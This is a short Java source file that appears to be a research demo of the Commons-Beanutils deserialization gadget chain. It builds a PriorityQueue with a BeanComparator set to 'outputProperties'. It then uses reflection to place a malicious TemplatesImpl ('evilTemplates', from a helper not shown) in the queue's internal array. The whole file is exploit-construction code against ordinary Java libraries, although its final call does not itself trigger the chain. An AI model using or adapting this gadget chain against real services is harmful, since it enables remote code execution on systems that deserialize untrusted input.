import ExpUtils.ExpUtils;
import ExpUtils.ReflectUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.IOException;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.PriorityQueue;


public class CommonBeanDemo {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException {
        TemplatesImpl evilTemplates = ExpUtils.getEvilTemplates();
        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue<Object> queue =  new PriorityQueue<Object>(2,beanComparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        ReflectUtils.setFields(beanComparator,"property","outputProperties");
        Field queueArr = ReflectUtils.getFields(queue,"queue");
        queueArr.setAccessible(true);
        Object[] obj = (Object[]) queueArr.get(queue);
        obj[0] = evilTemplates;
        obj[1] = evilTemplates;
        queue.comparator();


    }
}
